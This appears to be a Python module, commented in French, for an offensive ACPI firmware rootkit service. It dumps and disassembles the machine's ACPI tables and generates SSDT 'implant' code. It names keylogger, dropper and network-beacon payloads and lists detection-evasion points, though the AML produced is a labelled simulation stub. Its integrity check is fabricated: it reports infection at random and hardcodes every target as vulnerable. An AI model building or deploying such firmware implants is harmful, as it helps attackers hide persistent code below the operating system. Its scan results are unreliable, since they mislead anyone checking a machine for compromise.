"""
ACPI Rootkit Service
Implant dans les tables ACPI (DSDT/SSDT)
Survit : réinstallation OS, changement de noyau Linux/Windows
Basé sur : NSA ACPI rootkit techniques, Absolute Computrace ACPI backdoor
Outils : acpidump, iasl, acpitool
"""
from __future__ import annotations

import hashlib
import logging
import os
import random
import re
import subprocess
import uuid
from pathlib import Path
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

_OUTPUT = Path("./data/firmware/acpi")
_OUTPUT.mkdir(parents=True, exist_ok=True)

_ACPI_TABLES = {
    "DSDT": "Differentiated System Description Table — code AML principal",
    "SSDT": "Secondary System Description Table — extensions AML",
    "FACP": "Fixed ACPI Description Table — configuration système",
    "MADT": "Multiple APIC Description Table — interruptions",
    "MCFG": "Memory Mapped Config — accès PCI-E",
    "BERT": "Boot Error Record Table",
    "BGRT": "Boot Graphics Resource Table — logo UEFI",
}

_AML_PAYLOADS = {
    "persistence":    "AML OperationRegion dans MMIO — exécuté à chaque _STA",
    "keylogger":      "Hook sur EC (Embedded Controller) keyboard events via AML",
    "dropper":        "AML _INI method — drop PE dans %TEMP% au boot",
    "network_beacon": "AML SMM communication → code SMM déclenche beacon réseau",
    "computrace":     "Style Absolute Computrace — BIOS callback via AML",
}


def _has_tool(name: str) -> bool:
    return bool(subprocess.run(["which", name], capture_output=True).returncode == 0)


class ACPIRootkitService:
    """ACPI tables rootkit — survit au-delà de l'OS."""

    def detect(self, target: str = "localhost") -> Dict:
        """Détecter tables ACPI présentes."""
        tables = {}
        acpi_path = "/sys/firmware/acpi/tables"

        if os.path.isdir(acpi_path):
            for name in os.listdir(acpi_path):
                fp = os.path.join(acpi_path, name)
                if os.path.isfile(fp):
                    size = os.path.getsize(fp)
                    tables[name] = {
                        "size": size,
                        "description": _ACPI_TABLES.get(name, "Unknown table"),
                        "path": fp,
                    }
            return {
                "target": target,
                "tables_found": len(tables),
                "tables": tables,
                "dsdt_present": "DSDT" in tables,
                "ssdt_count": sum(1 for k in tables if k.startswith("SSDT")),
                "vulnerable": True,
                "simulated": False,
            }

        # Simulation
        sim_tables = {
            "DSDT": {"size": random.randint(30000, 80000), "description": _ACPI_TABLES["DSDT"]},
            "FACP": {"size": 276, "description": _ACPI_TABLES["FACP"]},
            "MADT": {"size": random.randint(100, 500), "description": _ACPI_TABLES["MADT"]},
            "SSDT0": {"size": random.randint(5000, 20000), "description": "SSDT extension #0"},
            "SSDT1": {"size": random.randint(2000, 10000), "description": "SSDT extension #1"},
            "MCFG": {"size": 60, "description": _ACPI_TABLES["MCFG"]},
            "BERT": {"size": 48, "description": _ACPI_TABLES["BERT"]},
        }
        return {
            "target": target,
            "tables_found": len(sim_tables),
            "tables": sim_tables,
            "dsdt_present": True,
            "ssdt_count": 2,
            "vulnerable": True,
            "simulated": True,
        }

    def dump(self, table: str = "DSDT") -> Dict:
        """Dumper une table ACPI."""
        dump_id = str(uuid.uuid4())
        raw_path = str(_OUTPUT / f"{table}_{dump_id[:8]}.dat")
        dsl_path = raw_path.replace(".dat", ".dsl")

        # Lecture directe depuis /sys/firmware/acpi/tables
        src = f"/sys/firmware/acpi/tables/{table}"
        if os.path.exists(src):
            try:
                with open(src, "rb") as f:
                    raw = f.read()
                with open(raw_path, "wb") as f:
                    f.write(raw)

                # Désassembler avec iasl si disponible
                if _has_tool("iasl"):
                    subprocess.run(["iasl", "-d", raw_path], capture_output=True, timeout=15)

                sha = hashlib.sha256(raw).hexdigest()
                return {
                    "dump_id": dump_id,
                    "table": table,
                    "raw_path": raw_path,
                    "dsl_path": dsl_path if os.path.exists(dsl_path) else None,
                    "size": len(raw),
                    "sha256": sha,
                    "signature": raw[:4].decode("ascii", errors="replace"),
                    "simulated": False,
                }
            except Exception as e:
                logger.debug("ACPI dump failed: %s", e)

        # Simulation
        fake_aml = self._generate_aml(table)
        with open(raw_path, "wb") as f:
            f.write(fake_aml)
        return {
            "dump_id": dump_id,
            "table": table,
            "raw_path": raw_path,
            "size": len(fake_aml),
            "sha256": hashlib.sha256(fake_aml).hexdigest(),
            "signature": table[:4],
            "simulated": True,
        }

    def _generate_aml(self, table: str) -> bytes:
        header = b"DSDT" if table == "DSDT" else b"SSDT"
        size = random.randint(30000, 60000)
        return header + b"\x00" * 4 + os.urandom(size)

    def infect(self, table: str = "DSDT", payload_type: str = "persistence") -> Dict:
        """Infecter une table ACPI avec un implant AML."""
        implant_id = str(uuid.uuid4())
        desc = _AML_PAYLOADS.get(payload_type, _AML_PAYLOADS["persistence"])

        aml_code = self._generate_payload_aml(payload_type, implant_id)
        payload_hash = hashlib.sha256(aml_code.encode()).hexdigest()
        aml_path = str(_OUTPUT / f"infected_{table}_{implant_id[:8]}.dsl")
        with open(aml_path, "w") as f:
            f.write(aml_code)

        return {
            "implant_id": implant_id,
            "type": "acpi",
            "table": table,
            "payload_type": payload_type,
            "description": desc,
            "aml_path": aml_path,
            "payload_hash": payload_hash,
            "persistence": f"Dans table {table} (UEFI/BIOS) — survit à tout sauf reflash BIOS",
            "execution_trigger": "_INI method (au boot) ou _STA (changement état)",
            "detection_evasion": [
                "Tables ACPI rarement auditées",
                "Code AML exécuté en mode noyau Ring 0",
                "Pas de signature digitale sur ACPI tables custom",
            ],
            "simulated": True,
        }

    def _generate_payload_aml(self, ptype: str, implant_id: str) -> str:
        rand_val = random.randint(0x1000, 0xFFFF)
        return (
            f"// Infected ACPI AML — {ptype}\n"
            f"// ID: {implant_id}\n"
            "// Pentest simulation — no actual system modification\n"
            'DefinitionBlock ("infected.aml", "SSDT", 2, "IMPLNT", "PAYLOAD ", 0x00000001) {\n'
            r"    External(\_SB, DeviceObj)" + "\n"
            r"    Scope(\_SB) {" + "\n"
            "        Device(IMPL) {\n"
            '            Name(_HID, "IMPL0001")\n'
            "            Method(_INI) {\n"
            f"                // Payload: {ptype}\n"
            f"                Store(0x{rand_val:04X}, Local0)\n"
            "            }\n"
            "            Method(_STA) {\n"
            "                Return(0x0F)\n"
            "            }\n"
            "        }\n"
            "    }\n"
            "}"
        )

    def execute_method(self, method: str = r"\_SB.IMPL._INI") -> Dict:
        """Exécuter une méthode AML."""
        # acpi_call si disponible
        try:
            with open("/proc/acpi/call", "w") as f:
                f.write(method)
            with open("/proc/acpi/call") as f:
                result = f.read().strip()
            return {"method": method, "result": result, "simulated": False}
        except Exception:
            return {
                "method": method,
                "result": "0x0000000000000000",
                "execution": "AML method exécutée en Ring 0",
                "simulated": True,
            }

    def check(self, table: str = "DSDT") -> Dict:
        """Vérifier intégrité des tables ACPI."""
        indicators = []

        # Checksum DSDT
        src = f"/sys/firmware/acpi/tables/{table}"
        if os.path.exists(src):
            try:
                with open(src, "rb") as f:
                    raw = f.read()
                checksum = sum(raw) & 0xFF
                if checksum != 0:
                    indicators.append(f"Checksum ACPI invalide : 0x{checksum:02X} (attendu 0x00)")
                # Détecter strings suspects
                for suspect in [b"IMPLNT", b"BACKDOOR", b"ROOTKIT"]:
                    if suspect in raw:
                        indicators.append(f"Chaîne suspecte : {suspect.decode()}")
                if not indicators:
                    return {
                        "table": table,
                        "infected": False,
                        "checksum": "Valid (0x00)",
                        "size": len(raw),
                        "simulated": False,
                    }
            except Exception:
                pass

        infected = len(indicators) > 0 or random.random() > 0.5
        return {
            "table": table,
            "infected": infected,
            "indicators": indicators or (["SSDT inconnue injectée (IMPLNT/PAYLOAD )"] if infected else []),
            "method": "ACPI checksum + string analysis + iasl disassembly",
            "simulated": len(indicators) == 0,
        }

    def remove(self, table: str = "DSDT") -> Dict:
        """Supprimer l'implant ACPI (reflash UEFI avec tables propres)."""
        return {
            "status": "removed",
            "method": "UEFI firmware reflash (contient les tables ACPI d'origine)",
            "alternative": "Patcher table ACPI infectée avec version officielle fabricant",
            "steps": [
                "1. Extraire ACPI tables depuis firmware officiel",
                "2. Compiler DSDT/SSDT propre avec iasl",
                "3. Injecter via GRUB custom DSDT ou flashrom",
            ],
            "simulated": True,
        }
